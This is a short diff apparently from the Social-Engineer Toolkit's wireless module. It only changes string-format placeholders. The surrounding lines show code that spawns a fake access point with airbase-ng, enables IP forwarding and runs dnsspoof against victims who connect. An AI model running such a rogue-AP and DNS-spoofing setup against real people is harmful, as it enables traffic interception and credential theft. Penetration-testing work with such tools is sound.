@@ -114,7 +114,7 @@ if os.path.isfile("/usr/local/sbin/airmon-ng"):
 else:
     airmonng_path = "src/wireless/airmon-ng"
 
-monproc = subprocess.Popen("{} start {} |"
+monproc = subprocess.Popen("{0} start {1} |"
                            "grep \"monitor mode enabled on\" |"
                            "cut -d\" \" -f5 |"
                            "sed -e \'s/)$//\'".format(airmonng_path, interface),
@@ -127,7 +127,7 @@ subprocess.Popen("modprobe tun", shell=True).wait()
 
 # create a fake access point
 core.print_status("Spawning airbase-ng in a separate child thread...")
-child = pexpect.spawn('{} -P -C 20 -e "{}" -c {} {}'.format(airbase_path, access_point, ap_channel, moniface))
+child = pexpect.spawn('{0} -P -C 20 -e "{1}" -c {2} {3}'.format(airbase_path, access_point, ap_channel, moniface))
 core.print_info("Sleeping 15 seconds waiting for airbase-ng to complete...")
 time.sleep(15)
 
@@ -156,7 +156,7 @@ child3 = pexpect.spawn("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 # start dnsspoof
 core.print_status("Starting DNSSpoof in a separate child thread...")
-child4 = pexpect.spawn("{} -i at0".format(dnsspoof_path))
+child4 = pexpect.spawn("{0} -i at0".format(dnsspoof_path))
 
 core.print_status("SET has finished creating the attack. If you experienced issues please report them.")
 core.print_status("Now launch SET attack vectors within the menus and have a victim connect via wireless.")
